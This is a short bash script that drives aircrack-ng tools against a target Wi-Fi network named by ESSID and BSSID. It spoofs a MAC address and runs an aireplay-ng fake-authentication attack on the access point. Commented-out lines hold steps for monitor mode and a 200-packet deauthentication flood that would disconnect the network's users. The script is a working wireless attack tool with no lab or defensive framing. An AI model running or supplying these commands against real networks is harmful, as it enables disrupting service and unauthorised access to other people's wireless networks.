#!/usr/bin/env bash
#666
mac=01:23:45:67:89:0A
#if [[ -z "$1" ]] || [[ -z "$2" ]];  then
#	echo "Usage: $0 [Target ESSID] [Target BSSID]";
#	exit 0;
#fi

#kill the previous wifi modes, sleep a few
#airmon-ng check kill
#sleep 2000

#start monitor mode on wlan0, sleep
#airmon-ng start wlan0
#sleep 1000

#aireplay-ng -h $mac -e "$1" -a "$2" -0 200 --ignore-negative-one mon0
aireplay-ng -h $mac -e "$1" -a "$2" --fakeauth 15 --ignore-negative-one mon0
